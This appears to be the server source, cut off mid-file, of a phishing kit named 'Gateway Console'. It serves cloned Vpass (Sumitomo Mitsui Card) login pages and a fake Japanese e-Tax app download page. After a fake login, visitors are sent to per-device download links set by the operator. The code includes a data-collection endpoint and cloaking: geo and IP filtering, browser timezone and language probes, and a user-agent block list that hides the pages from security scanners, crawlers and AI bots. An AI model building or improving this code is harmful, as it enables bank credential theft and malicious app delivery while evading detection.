#!/usr/bin/env python3
"""Lightweight administration server for Gateway Console."""

from __future__ import annotations

import argparse
import collections
import base64
import hashlib
import hmac
import json
import mimetypes
import os
import re
import secrets
import shutil
import sqlite3
import struct
import subprocess
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone
from http import HTTPStatus
from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, quote, unquote, urlparse


ROOT = Path(__file__).resolve().parent
STATIC_DIR = ROOT / "static"
SOURCE_DIR = ROOT / "sources"
# WebAssembly 必须按 application/wasm 下发，否则 instantiateStreaming 会失败
mimetypes.add_type("application/wasm", ".wasm")
DATA_DIR = Path(os.environ.get("GATEWAY_DATA_DIR", ROOT / "data"))
# 重建产物目录（每站一套纯静态页 + 预览图）：优先读这里，没有再退回项目源码目录
REBUILD_DIR = Path(os.environ.get("GATEWAY_REBUILD_DIR", ROOT / "rebuild"))
DB_PATH = DATA_DIR / "gateway.db"
SESSION_TTL = 12 * 60 * 60
CAPTCHA_TTL = 5 * 60
REPORT_TIMEZONE = timezone(timedelta(hours=8), "Asia/Shanghai")
REPORT_RESET_HOUR = 22
DOMAIN_RE = re.compile(
    r"^(?=.{1,253}$)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$",
    re.IGNORECASE,
)
PORT_RE = re.compile(r"^[1-9][0-9]{1,4}$")
REDIRECT_LIMIT_RE = re.compile(r"^[0-9]{1,9}$")

SOURCE_CATALOG = {
    "landing-page": {
        "id": "landing-page",
        "name": "Landing page",
        "slug": "landing-page",
        "filename": "landing-page",
        "description": "Complete static landing page source",
        "country": "",
        "site_url": "",
        "entry": "logo.gif",
        "preview": "",
    },
    "vpass-flow": {
        "id": "vpass-flow",
        "name": "Vpass 三井流程",
        "slug": "vpass-flow",
        "filename": "vpass-flow",
        "description": "Vpass / 三井住友卡流程模板：人机验证 → 登录首页 → App 更新页，"
                       "更新页按钮按安卓 / 苹果 / PC 分别跳转到后台自定义地址",
        "country": "JP",
        "site_url": "",
        "entry": "index.html",
        "preview": "assets/vpass_logo.svg",
    },
    "tax-app-jp": {
        "id": "tax-app-jp",
        "name": "国税e-Tax アプリ",
        "slug": "tax-app-jp",
        "filename": "tax-app-jp",
        "description": "日本国税厅 e-Tax 应用下载页，Google Play 风格移动端模板，含安装按钮与截图轮播",
        "country": "JP",
        "site_url": "https://www.e-tax.nta.go.jp",
        "entry": "index.html",
        "preview": "assets/app-icon.png",
    },
}

# 批量前台源码目录（t3-v3 提取的日本 167 个站点，目录在 sources/<站点名>/）。
# 正常由 sources_catalog.py 提供；该文件缺失（老安装包只拷 app.py）时，
# 这里直接扫 sources/ 兜底生成，保证目录里的站点不会「装了却看不见」。
ISO_COUNTRY_CODES = frozenset(
    "AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ BA BB BD BE BF BG BH BI BJ BL BM BN BO BQ "
    "BR BS BT BV BW BY BZ CA CC CD CF CG CH CI CK CL CM CN CO CR CU CV CW CX CY CZ DE DJ DK DM DO "
    "DZ EC EE EG EH ER ES ET FI FJ FK FM FO FR GA GB GD GE GF GG GH GI GL GM GN GP GQ GR GS GT GU "
    "GW GY HK HM HN HR HT HU ID IE IL IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW "
    "KY KZ LA LB LC LI LK LR LS LT LU LV LY MA MC MD ME MF MG MH MK ML MM MN MO MP MQ MR MS MT MU "
    "MV MW MX MY MZ NA NC NE NF NG NI NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW "
    "PY QA RE RO RS RU RW SA SB SC SD SE SG SH SI SJ SK SL SM SN SO SR SS ST SV SX SY SZ TC TD TF "
    "TG TH TJ TK TL TM TN TO TR TT TV TW TZ UA UG UM US UY UZ VA VC VE VG VI VN VU WF WS YE YT ZA "
    "ZM ZW UK".split()
)
SOURCE_PREVIEW_NAMES = ("favicon.ico", "favicon.svg", "favicon.png", "logo.png", "logo.svg")


def guess_country(site_name: str) -> str:
    codes = [tok.upper() for tok in re.split(r"[_\-]+", site_name.lower())
             if tok.upper() in ISO_COUNTRY_CODES]
    return codes[-1] if codes else ""


def build_runtime_catalog() -> dict:
    """sources/ 目录兜底建目录：只认有 index.html 的站点目录。"""
    catalog: dict[str, dict] = {}
    if not SOURCE_DIR.is_dir():
        return catalog
    for entry in sorted(SOURCE_DIR.iterdir()):
        if not entry.is_dir() or not (entry / "index.html").is_file():
            continue
        preview = next((name for name in SOURCE_PREVIEW_NAMES if (entry / name).is_file()), "")
        catalog[entry.name] = {
            "id": entry.name,
            "name": entry.name,
            "slug": entry.name,
            "filename": entry.name,
            "description": "静态前台源码",
            "country": guess_country(entry.name),
            "site_url": "",
            "entry": "index.html",
            "preview": preview,
        }
    return catalog


try:
    from sources_catalog import EXTRA_SOURCES
except Exception as _catalog_exc:  # pragma: no cover - 只在文件缺失/损坏时触发
    print(f"[catalog] sources_catalog.py 未加载（{_catalog_exc}），改为扫描 sources/ 目录")
    EXTRA_SOURCES = build_runtime_catalog()
for _source_id, _source_item in EXTRA_SOURCES.items():
    SOURCE_CATALOG.setdefault(_source_id, _source_item)
print(f"[catalog] 内置源码目录共 {len(SOURCE_CATALOG)} 条")

# t3 平台导出的站点 HTML 里写死 /sites/<code>/ 资源前缀，出页面时改回根路径
SITES_PREFIX_RE = re.compile(rb"/sites/[A-Za-z0-9._~\-]+/")

CAPTCHA_COOKIE = "gw_verified"
# 第二道门禁：登录凭据。登录页提交后由 /flow/login 签发，
# 更新页与扫码页都要它，防止验证通过后直接跳到第三步。
FLOW_COOKIE = "gw_login"
# 这些页面必须带 FLOW_COOKIE 才能访问，否则回退到入口页重新走流程。
FLOW_GUARDED_PAGES = ("vpass_update.html", "pc_download.html")
# 业务流内部页面：这些页面是「验证 → 登录 → 更新 → 下载」这条链上的环节，
# 不是营销落地页。给它们注入点击拦截器会把流程内的按钮劫持到分流地址，
# 导致用户填完登录信息直接被弹去外链、跳过更新检测页。
# 只对「多步骤流程型模板」生效；落地页模板（landing-page / tax-app-jp）
# 的入口页仍需点击分流，所以不能只按文件名判断，要连模板一起看。
# vpass-flow 登录页(index.html)必须豁免：登录按钮只负责走完整流程
# (登录 -> 安检/检测 -> 更新引导 -> 下载)，若被点击拦截器劫持，
# 配了分流的端会在登录页点击时直接跳去分流下载地址，整个流程被跳过。
# 分流跳转只在更新引导页的下载按钮生效（后台分流设置 > 模板流程）。
FLOW_CAPTURE_EXEMPT_PAGES = {
    "vpass-flow": ("index.html", "vpass_update.html", "pc_download.html"),
}
CAPTCHA_TTL_DEFAULT = 2 * 60 * 60
CAPTCHA_MAX_TRIES_DEFAULT = 3
CAPTCHA_CELL_COUNT = 5
CAPTCHA_CELLS_DIR = STATIC_DIR / "captcha"
CAPTCHA_CHALLENGE_TTL = 15 * 60
CAPTCHA_SECRET = os.environ.get("GATEWAY_CAPTCHA_SECRET", "gateway-console-captcha-v1").encode()
CAPTCHA_LOCK = threading.Lock()
CAPTCHA_CHALLENGES: dict[str, dict] = {}
# IP 级验证失败冷却：{ip: {count, until}}。失败次数越多冷却越长（2s→5s→12s→…→600s 封顶），
# 成功验证后清零。正常访客几乎不会连错两次，脚本暴力刷题的成本指数级上升。
CAPTCHA_FAILS: dict[str, dict] = {}
CAPTCHA_COOLDOWN_TABLE = [0, 2, 5, 12, 24, 48, 96, 180, 300, 600]
CAPTCHA_MIN_SUBMIT_SECONDS = 2.0  # 页面渲染到提交的最短间隔：真人读题点击至少 2 秒
CAPTCHA_POW_PREFIX = "000"       # PoW 难度：sha256 前 3 个 hex 位为 0（平均 4096 次尝试）

# 浏览器环境探针（时区拦截用）：一次性 token，访客浏览器上报真实时区后签发签名 Cookie
ENV_COOKIE = "gw_client_env"
ENV_CHALLENGE_TTL = 180
ENV_CHALLENGES: dict[str, dict] = {}
ENV_LOCK = threading.Lock()

# 黑名单内存缓存（表内容启动加载、增删改查时同步）与访问频率滑动窗口
BLACKLIST_CACHE: set[str] = set()
BLACKLIST_LOADED = False
RATE_HITS: dict[str, "collections.deque"] = {}



# Factory defaults for every settings key. Also used as the fallback when a
# stored value cannot be decoded, so a corrupt row never breaks the site.
SETTINGS_DEFAULTS = {
    "ipregistry_api_key": "",
    "country_whitelist": "",
    "country_blacklist": "",
    "human_verification": False,
    "block_desktop": False,
    "block_ios": False,
    "block_android": False,
    "ipregistry_enabled": False,
    "blocked_ip_types": [],
    "blocked_threats": [],
    "redirect_url": "",
    "redirect_links": [],
    "client_redirect_rules": {},
    "client_redirect_enabled": False,
    "bot_redirect_enabled": False,
    "bot_redirect_url": "",
    "frontend_entry": "index.html",
    "captcha_enabled": False,
    "captcha_ttl_seconds": CAPTCHA_TTL_DEFAULT,
    "captcha_max_tries": CAPTCHA_MAX_TRIES_DEFAULT,
    # App 更新页（vpass-flow 模板）的分端跳转地址，后台可自定义
    "app_android_url": "",
    "app_ios_url": "",
    "app_desktop_url": "",
    # 浏览器环境拦截（机器人检测的一部分，作用于人机验证之前）
    "browser_lang_check": False,
    "browser_lang_whitelist": [],
    "browser_tz_check": False,
    "browser_tz_whitelist": [],
    # 访问频率封锁：窗口内页面请求数超限直接拉黑（黑名单中心可管理）
    "rate_check_enabled": False,
    "rate_window_seconds": 60,
    "rate_max_requests": 10,
}

# 客户端类型：bot（爬虫/自动化）优先级最高，其次移动端，最后桌面端
CLIENT_BOT = "bot"
CLIENT_IOS = "ios"
CLIENT_ANDROID = "android"
CLIENT_DESKTOP = "desktop"
CLIENT_UNKNOWN = "unknown"
CLIENT_BLACKLIST = "blacklist"
CLIENT_TYPES = (CLIENT_BOT, CLIENT_IOS, CLIENT_ANDROID, CLIENT_DESKTOP, CLIENT_UNKNOWN, CLIENT_BLACKLIST)
CLIENT_LABELS = {
    CLIENT_BOT: "爬虫/自动化",
    CLIENT_IOS: "iOS 设备",
    CLIENT_ANDROID: "Android 设备",
    CLIENT_DESKTOP: "电脑端",
    CLIENT_UNKNOWN: "未知客户端",
    CLIENT_BLACKLIST: "黑名单",
}

# 常见爬虫、自动化框架、HTTP 客户端特征。命中任意一条即判定为 bot。
BOT_UA_PATTERNS = (
    "bot", "spider", "crawler", "crawling", "slurp", "scrapy", "curl", "wget",
    "python-requests", "python-urllib", "httpx", "aiohttp", "libwww-perl",
    "java/", "go-http-client", "okhttp", "axios", "node-fetch", "postmanruntime",
    "headlesschrome", "phantomjs", "puppeteer", "playwright", "selenium",
    "lighthouse", "pagespeed", "gtmetrix", "semrushbot", "ahrefsbot", "mj12bot",
    "dotbot", "petalbot", "yandex", "baiduspider", "duckduckbot", "applebot",
    "facebookexternalhit", "whatsapp", "telegrambot", "discordbot", "slackbot",
    "twitterbot", "linkedinbot", "embedly", "quora link preview", "skypeuripreview",
    "nmap", "masscan", "zgrab", "zmap", "sqlmap", "nikto", "dirbuster", "gobuster",
    "wpscan", "nessus", "openvas", "zabbix", "monitoring", "uptime",
    "chatgpt", "gptbot", "claudebot", "perplexity", "ccbot", "youbot", "anthropic-ai",
)

# 移动端判定关键词
IOS_UA_PATTERNS = ("iphone", "ipad", "ipod", "ios", "iphone os", "cpu iphone os")
ANDROID_UA_PATTERNS = ("android", "android os")
MOBILE_UA_PATTERNS = ("mobile", "mobi", "opera mini", "opera mobi", "iemobile", "blackberry", "windows phone")


REDIRECTS: dict[str, dict] = {}
REDIRECT_LOCK = threading.Lock()

# Per-template accent colours so the verification page matches the site theme.
CAPTCHA_DEFAULT_THEME = {"accent": "#1f4d3d", "accent_dark": "#16382d"}
CAPTCHA_THEMES = {
    "tax-app-jp": {"accent": "#0f9d58", "accent_dark": "#0b8043"},
    # Vpass 品牌绿（#07866d / #05624f），与 vpass_captcha.html 一致
    "vpass-flow": {"accent": "#07866d", "accent_dark": "#05624f"},
    "landing-page": {"accent": "#1f4d3d", "accent_dark": "#16382d"},
}

# 验证页皮肤：模板可指定不复用通用政府风格页面，而是 1:1 复刻自己的素材页。
# 这样运营给某个客户做的验证页外观能被原样搬进系统，校验逻辑仍走服务端。
# 注意：本表在文件后段 VPASS_* 三常量定义完成后才赋值（见下方同名赋值处），
# 这里先留空壳，避免 NameError。
CAPTCHA_SKINS: dict[str, dict] = {}

def build_skin_captcha_page(skin: dict, challenge: dict, template_slug: str,
                            error: str = "", tries_left: int = 0,
                            verify_url: str = "/captcha/verify",
                            go_url: str = "/captcha/go/", prefix: str = "") -> bytes:
    """Render a template-branded verification page.

    Same placeholder contract as build_captcha_page, so the caller cannot tell
    the two apart. Only the chrome changes — the grid, the token and the
    answer check all stay server side.
    """
    need = int(challenge["need"])
    max_tries = CAPTCHA_MAX_TRIES_DEFAULT
    # 素材页是「点满 N 个才能按确认」，所以按钮由 JS 控制 enabled 状态，
    # 失败提示统一用素材的红色条。
    cells = "".join(
        '<div class="cp-item" data-index="{index}" role="button" tabindex="0" '
        'aria-label="アイコン {number}">'
        '<img src="/captcha/{icon}" alt="{alt}"></div>'.format(
            index=cell["index"],
            number=cell["index"] + 1,
            icon="security.png" if cell["type"] == "security" else "captcha-decoy.png",
            alt="セキュリティアイコン" if cell["type"] == "security" else "アイコン",
        )
        for cell in challenge["cells"]
    )
    page = skin["html"]
    for key, value in [
        ("__CSS__", skin["css"]),
        ("__CELLS__", cells),
        ("__NEED__", str(need)),
        ("__LOGO__", (prefix or "") + (skin.get("logo") or "")),
        ("__FAVICON__", (prefix or "") + (skin.get("favicon") or "")),
    ]:
        page = page.replace(key, value)
    page = page.replace("__JS__", skin["js"])
    page = page.replace("%%NEED%%", str(need))
    page = page.replace("%%TRIES%%", str(max_tries))
    page = page.replace("%%TOKEN%%", json.dumps(challenge["token"]))
    page = page.replace("%%CHALLENGE%%", json.dumps(challenge["id"]))
    page = page.replace("%%VERIFY_URL%%", json.dumps(verify_url))
    page = page.replace("%%GO_URL%%", json.dumps(go_url))
    page = page.replace("%%POW%%", json.dumps(challenge.get("pow", "")))
    return page.encode("utf-8")

# Answers are only stored server side; the browser never learns which cells
# are the decoys. Cells are shuffled per challenge so the answer is not stable.
def new_captcha_challenge(ip: str) -> dict:
    """Create a challenge: grid layout plus the hidden solution."""
    target_count = secrets.randbelow(2) + 2  # 2 or 3 shields among the cells
    cells = [{"type": "security" if i < target_count else "decoy", "index": i}
             for i in range(CAPTCHA_CELL_COUNT)]
    secrets.SystemRandom().shuffle(cells)
    answer = sorted(cell["index"] for cell in cells if cell["type"] == "security")
    payload = {
        "ip": ip[:128],
        "cells": cells,
        "answer": answer,
        "tries": 0,
        "created_at": time.time(),
        "pow": secrets.token_hex(8),
    }
    challenge_id = secrets.token_urlsafe(18)
    token = sign_captcha(challenge_id)
    with CAPTCHA_LOCK:
        CAPTCHA_CHALLENGES[challenge_id] = payload
        prune_captcha_challenges()
    prune_captcha_fails()
    # "answer" stays server side; the page only learns the cell layout and how
    # many shields to pick.
    return {"id": challenge_id, "token": token, "cells": cells, "need": len(answer),
            "pow": payload["pow"]}


def sign_captcha(challenge_id: str) -> str:
    signature = hmac.new(CAPTCHA_SECRET, challenge_id.encode(), hashlib.sha256).hexdigest()[:24]
    return f"{challenge_id}.{signature}"


def captcha_cooldown_remaining(ip: str) -> int:
    """Return seconds this IP must wait before submitting again (0 = free)."""
    entry = CAPTCHA_FAILS.get(ip)
    if not entry:
        return 0
    return max(0, int(entry["until"] - time.time()))


def captcha_register_fail(ip: str) -> int:
    """Record one failed attempt; returns the cooldown seconds applied."""
    with CAPTCHA_LOCK:
        entry = CAPTCHA_FAILS.setdefault(ip, {"count": 0, "until": 0.0})
        entry["count"] += 1
        entry["until"] = time.time() + CAPTCHA_COOLDOWN_TABLE[
            min(entry["count"], len(CAPTCHA_COOLDOWN_TABLE) - 1)
        ]
        return int(entry["until"] - time.time())


def captcha_clear_fails(ip: str) -> None:
    with CAPTCHA_LOCK:
        CAPTCHA_FAILS.pop(ip, None)


def prune_captcha_fails() -> None:
    now = time.time()
    with CAPTCHA_LOCK:
        for ip in [ip for ip, e in CAPTCHA_FAILS.items() if e["until"] < now - 660]:
            CAPTCHA_FAILS.pop(ip, None)


def new_env_challenge(ip: str) -> str:
    """Issue a one-shot browser-environment probe token bound to this IP."""
    token = secrets.token_urlsafe(18)
    with ENV_LOCK:
        ENV_CHALLENGES[token] = {"ip": ip[:128], "created_at": time.time()}
        expired = [t for t, e in ENV_CHALLENGES.items()
                   if time.time() - e["created_at"] > ENV_CHALLENGE_TTL]
        for t in expired:
            ENV_CHALLENGES.pop(t, None)
    return token


def build_client_probe_page(prefix: str, token: str) -> bytes:
    """A sub-second invisible probe: collect timezone via JS, then reload.

    Runs BEFORE the human verification page. Bots that never execute JS stay
    trapped on this page; real visitors pass through in a blink.
    """
    probe_url = json.dumps(prefix + "/__client/env")
    page = CLIENT_PROBE_HTML.replace("__PROBE_URL__", probe_url)
    page = page.replace("%%TOKEN%%", json.dumps(token))
    return page.encode("utf-8")


CLIENT_PROBE_HTML = """<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>セキュリティチェック</title>
<style>
body{margin:0;font-family:system-ui,-apple-system,"Segoe UI",sans-serif;background:#f5f7f6;color:#1a3c34;display:grid;place-items:center;min-height:100vh}
.box{text-align:center}
.spin{width:34px;height:34px;margin:0 auto 14px;border:3px solid #d8e2de;border-top-color:#07866d;border-radius:50%;animation:gws .8s linear infinite}
@keyframes gws{to{transform:rotate(360deg)}}
p{font-size:13px;color:#5d6b66;margin:0}
</style>
</head>
<body>
<div class="box"><div class="spin"></div><p id="m">セキュリティを確認しています...</p></div>
<script>
(function(){
var d={tz:"",ls:""};
try{d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"";}catch(e){}
try{d.ls=(navigator.languages||[navigator.language||""]).join(",");}catch(e){}
fetch(__PROBE_URL__,{method:"POST",credentials:"same-origin",headers:{"Content-Type":"application/json"},
body:JSON.stringify({token:%%TOKEN%%,tz:d.tz,langs:d.ls})})
.then(function(r){return r.json();})
.then(function(j){if(j&&j.ok){location.reload();}else{document.getElementById("m").textContent="読み込みに失敗しました。ページを再読み込みしてください。";}})
.catch(function(){setTimeout(function(){location.reload();},1500);});
})();
</script>
</body>
</html>
"""


def rate_hit_and_exceed(ip: str, window: int, limit: int) -> bool:
    """Record one page request for this IP; True when over the window limit."""
    now = time.time()
    # RATE_HITS 每个新 IP 加一个 key，长期运行必须回收，否则无限增长
    if len(RATE_HITS) > 1000:
        prune_rate_hits(window)
    with ENV_LOCK:
        dq = RATE_HITS.setdefault(ip, collections.deque())
        while dq and dq[0] < now - window:
            dq.popleft()
        dq.append(now)
        return len(dq) > limit


# 采集口限流：同 IP 每分钟 60 次，超了直接 429，不落库。
COLLECT_HITS: dict[str, "collections.deque"] = {}
COLLECT_LOCK = threading.Lock()


def collect_rate_ok(ip: str, window: int = 60, limit: int = 60) -> bool:
    now = time.time()
    with COLLECT_LOCK:
        if len(COLLECT_HITS) > 1000:  # 同上：回收过期的 IP 键，避免字典无限增长
            for key in [k for k, dq in COLLECT_HITS.items() if not dq or dq[-1] < now - window]:
                COLLECT_HITS.pop(key, None)
        dq = COLLECT_HITS.setdefault(ip, collections.deque())
        while dq and dq[0] < now - window:
            dq.popleft()
        dq.append(now)
        return len(dq) <= limit


def prune_rate_hits(window: int) -> None:
    now = time.time()
    with ENV_LOCK:
        for ip in [ip for ip, dq in RATE_HITS.items() if not dq or dq[-1] < now - window]:
            RATE_HITS.pop(ip, None)


def solve_captcha_pow(pow_challenge: str, nonce: str) -> bool:
    """Server-side PoW check: sha256(pow + ':' + nonce) must start with '000'."""
    if not nonce or not re.fullmatch(r"[0-9]{1,12}", nonce):
        return False
    digest = hashlib.sha256(f"{pow_challenge}:{nonce}".encode()).hexdigest()
    return digest.startswith(CAPTCHA_POW_PREFIX)


def verify_captcha_signature(token: str) -> str:
    """Return the challenge id when the HMAC matches, otherwise an empty string."""
    challenge_id, _, signature = str(token or "").partition(".")
    if not challenge_id or not signature:
        return ""
    expected = sign_captcha(challenge_id).partition(".")[2]
    if not expected or not hmac.compare_digest(signature, expected):
        return ""
    return challenge_id


def prune_captcha_challenges():
    now = time.time()
    stale = [key for key, item in CAPTCHA_CHALLENGES.items()
             if now - item["created_at"] > CAPTCHA_CHALLENGE_TTL]
    for key in stale:
        CAPTCHA_CHALLENGES.pop(key, None)


def prune_redirects():
    """Drop one-shot redirect tokens that were never consumed."""
    now = time.time()
    for key in [k for k, v in REDIRECTS.items() if now - v["created_at"] > CAPTCHA_CHALLENGE_TTL]:
        REDIRECTS.pop(key, None)


def get_captcha_challenge(challenge_id: str):
    """Return the live challenge dict so attempt counters persist, or None."""
    with CAPTCHA_LOCK:
        item = CAPTCHA_CHALLENGES.get(challenge_id)
        if not item:
            return None
        if time.time() - item["created_at"] > CAPTCHA_CHALLENGE_TTL:
            CAPTCHA_CHALLENGES.pop(challenge_id, None)
            return None
        return item


CAPTCHA_CSS = """
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html{background:#fff}
body{font-family:-apple-system,BlinkMacSystemFont,"Hiragino Sans","Hiragino Kaku Gothic ProN","Yu Gothic",Meiryo,"Noto Sans JP",sans-serif;background:#fff;color:#1a1a1a;font-size:14px;line-height:1.8;-webkit-font-smoothing:antialiased}
.gw-bar{height:4px;background:var(--gw-accent)}
.gw-hd{border-bottom:1px solid var(--gw-line);padding:14px 20px;display:flex;align-items:baseline;justify-content:space-between;gap:12px}
.gw-hd-org{font-size:13px;font-weight:500;color:var(--gw-accent);letter-spacing:.02em;white-space:nowrap}
.gw-hd-sys{font-size:11.5px;color:var(--gw-muted);text-align:right;letter-spacing:.03em}
.gw-wrap{padding:26px 20px 40px}
.gw-doc{max-width:620px;margin:0 auto}
.gw-notice{background:#f2f5f3;border-left:3px solid var(--gw-accent);padding:9px 13px;font-size:12px;color:#3d4a44;margin-bottom:30px}
.gw-ttl{font-size:17px;font-weight:500;letter-spacing:.01em;margin-bottom:8px}
.gw-ttl-rule{width:100%;height:1px;background:var(--gw-line);margin-bottom:22px}
.gw-lead{font-size:13.5px;color:#333;margin-bottom:18px}
.gw-lead strong{font-weight:500;color:var(--gw-accent)}
.gw-steps{margin:0 0 26px;padding:0;list-style:none}
.gw-step{display:flex;gap:10px;padding:11px 0;border-bottom:1px solid #e8ecea;align-items:flex-start}
.gw-step:first-child{border-top:1px solid #e8ecea}
.gw-step-no{flex-shrink:0;width:19px;height:19px;background:var(--gw-accent);color:#fff;font-size:11px;line-height:19px;text-align:center;margin-top:2px;font-variant-numeric:tabular-nums}
.gw-step-tx{font-size:13px;color:#2b3330;line-height:1.75}
.gw-step-tx b{font-weight:500;color:var(--gw-accent)}
.gw-vhead{display:flex;align-items:baseline;justify-content:space-between;gap:12px;margin-bottom:10px;flex-wrap:wrap}
.gw-vlabel{font-size:12.5px;color:#333;font-weight:500}
.gw-vcount{font-size:12px;color:#5c6e66;font-variant-numeric:tabular-nums}
.gw-grid{display:flex;gap:8px;margin-bottom:8px}
.gw-cell{flex:1 1 0;max-width:92px;aspect-ratio:1/1;border:1px solid #9aa8a2;background:#fff;cursor:pointer;padding:0;position:relative;display:flex;align-items:center;justify-content:center;transition:background-color .12s,border-color .12s;-webkit-tap-highlight-color:transparent}
.gw-cell img{width:100%;height:100%;object-fit:contain;padding:18%;pointer-events:none;display:block}
.gw-cell.decoy{background:#f6f7f6;border-color:#c2cbc6}
.gw-cell:hover{border-color:#5c6e66}
.gw-cell.on{background:var(--gw-accent);border-color:var(--gw-accent)}
.gw-cell.on img{filter:brightness(0) invert(1);opacity:.92}
.gw-cell.decoy.on{background:#7d8a84;border-color:#7d8a84}
.gw-cell:focus-visible{outline:2px solid var(--gw-accent);outline-offset:2px}
.gw-cell[disabled]{cursor:not-allowed}
.gw-vnote{font-size:11.5px;color:var(--gw-muted);margin-bottom:24px}
.gw-act{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;padding-top:18px;border-top:1px solid #e8ecea}
.gw-act-tx{font-size:12px;color:var(--gw-muted);line-height:1.7}
.gw-btn{flex-shrink:0;min-width:108px;padding:10px 20px;background:#c8cfcb;color:#fff;border:none;border-radius:0;font-size:13px;font-weight:500;letter-spacing:.08em;cursor:not-allowed;font-family:inherit;transition:background-color .18s}
.gw-btn.ready{background:var(--gw-accent);cursor:pointer}
.gw-btn.ready:hover,.gw-btn.ready:active{background:var(--gw-accent-dark)}
.gw-msg{margin-top:16px;padding:11px 13px;font-size:12.5px;line-height:1.7;display:none;border-left:3px solid}
.gw-msg.show{display:block}
.gw-msg.ok{background:#f2f6f4;border-color:var(--gw-accent);color:#1a3d2e}
.gw-msg.err{background:#fbf4f3;border-color:var(--gw-error);color:#7a2626}
.gw-banner{margin:0 0 18px;padding:10px 13px;font-size:12.5px;line-height:1.7;border-left:3px solid}
.gw-banner-error{background:#fbf4f3;border-color:var(--gw-error);color:#7a2626}
.gw-spin{display:none;align-items:center;gap:8px;margin-top:14px;font-size:12px;color:var(--gw-muted)}
.gw-spin.on{display:flex}
.gw-ring{width:13px;height:13px;border:1.5px solid #dfe4e1;border-top-color:var(--gw-accent);border-radius:50%;animation:gw-sp .8s linear infinite}
@keyframes gw-sp{to{transform:rotate(360deg)}}
.gw-ft{border-top:1px solid var(--gw-line);margin-top:32px;padding:16px 0 0;font-size:11px;color:#8a9490;line-height:1.9}
@media (max-width:560px){.gw-wrap{padding:20px 16px 32px}.gw-hd{padding:12px 16px;flex-direction:column;gap:2px;align-items:flex-start}.gw-hd-sys{text-align:left}.gw-cell{max-width:100%}}
@media (max-width:400px){body{font-size:13.5px}.gw-wrap{padding:18px 14px 28px}.gw-hd{padding:11px 14px}.gw-ttl{font-size:16px}.gw-lead{font-size:13px}.gw-step{padding:10px 0}.gw-step-tx{font-size:12.5px}.gw-grid{gap:6px}.gw-cell img{padding:15%}.gw-btn{min-width:96px;padding:10px 16px;font-size:12.5px}}
@media (max-width:340px){.gw-wrap{padding:16px 11px 24px}.gw-grid{gap:5px}.gw-cell img{padding:13%}.gw-act{gap:10px}.gw-btn{min-width:88px;padding:9px 14px;letter-spacing:.05em}.gw-ft{font-size:10.5px}}
@media (max-width:320px){.gw-wrap{padding:14px 9px 22px}.gw-grid{gap:4px}.gw-cell img{padding:11%}.gw-vhead{gap:6px}.gw-act{flex-direction:column;align-items:stretch}.gw-btn{width:100%}}
"""

CAPTCHA_JS = """
(function(){
var NEED=%%NEED%%,TRIES=%%TRIES%%,TOKEN=%%TOKEN%%,CHALLENGE=%%CHALLENGE%%,VERIFY_URL=%%VERIFY_URL%%,GO_URL=%%GO_URL%%;
var POW=%%POW%%,powNonce='',powReady=null;
function gwShaHex(input){
  return crypto.subtle.digest('SHA-256',new TextEncoder().encode(input)).then(function(buf){
    return Array.prototype.map.call(new Uint8Array(buf),function(x){return ('0'+x.toString(16)).slice(-2);}).join('');
  });
}
/* 页面加载即后台求解工作量证明（平均约四千次哈希，用户读题期间完成，无感） */
function gwSolve(){
  var i=0;
  function step(){
    return gwShaHex(POW+':'+i).then(function(hex){
      if(hex.slice(0,3)==='000')return String(i);
      i++;return step();
    });
  }
  return step().catch(function(){return '';});
}
function gwRecompute(nextPow){POW=nextPow;powReady=gwSolve().then(function(n){powNonce=n;});}
powReady=gwSolve().then(function(n){powNonce=n;});
var selected=[],busy=false;
var grid=document.getElementById('gwGrid'),btn=document.getElementById('gwBtn');
var msg=document.getElementById('gwMsg'),spin=document.getElementById('gwSpin');
function sync(){
document.getElementById('gwSel').textContent=selected.length;
btn.disabled=selected.length!==NEED||busy;
btn.classList.toggle('ready',!btn.disabled);
}
grid.addEventListener('click',function(e){
var cell=e.target.closest('.gw-cell');
if(!cell||busy||cell.disabled)return;
var i=Number(cell.dataset.index);
var at=selected.indexOf(i);
if(at>-1){selected.splice(at,1);cell.classList.remove('on');}
else{selected.push(i);cell.classList.add('on');}
sync();
});
btn.addEventListener('click',async function(){
if(busy||selected.length!==NEED)return;
busy=true;try{await powReady;}catch(e){}btn.disabled=true;btn.style.display='none';spin.classList.add('on');msg.className='gw-msg';
try{
var res=await fetch(VERIFY_URL,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({captchaId:CHALLENGE,token:TOKEN,clickedPositions:selected,powNonce:(function(n){try{return n;}catch(e){return '';}})(powNonce)})});
var data=await res.json();
    if(data.powChallenge){gwRecompute(data.powChallenge);}
if(data.success){
spin.classList.remove('on');msg.className='gw-msg ok show';
msg.textContent=data.message||'確認が完了しました。転送しています...';
window.location.replace(data.redirect||(GO_URL+encodeURIComponent(data.redirectToken||'')));
return;
}
busy=false;spin.classList.remove('on');msg.className='gw-msg err show';
msg.textContent=data.message||'確認に失敗しました。';
if(data.error==='MAX_ATTEMPTS_EXCEEDED'||data.error==='IP_BANNED'){
btn.style.display='none';
grid.querySelectorAll('.gw-cell').forEach(function(c){c.disabled=true;c.style.opacity='.35';});
}else if(data.error==='CAPTCHA_EXPIRED'){
setTimeout(function(){window.location.reload();},1800);
}else{
btn.style.display='';
selected=[];
grid.querySelectorAll('.gw-cell').forEach(function(c){c.classList.remove('on');});
if(typeof data.triesLeft==='number'){
var left=data.triesLeft;
document.getElementById('gwTries').textContent=(left>0&&left<TRIES)?('　（残り '+left+' 回）'):'';
}
sync();
}
}catch(err){
busy=false;spin.classList.remove('on');btn.style.display='';btn.disabled=false;
msg.className='gw-msg err show';
msg.textContent='ネットワークエラーが発生しました。再試行してください。';
sync();
}
});
sync();
})();
"""

CAPTCHA_HTML = """<!DOCTYPE html>
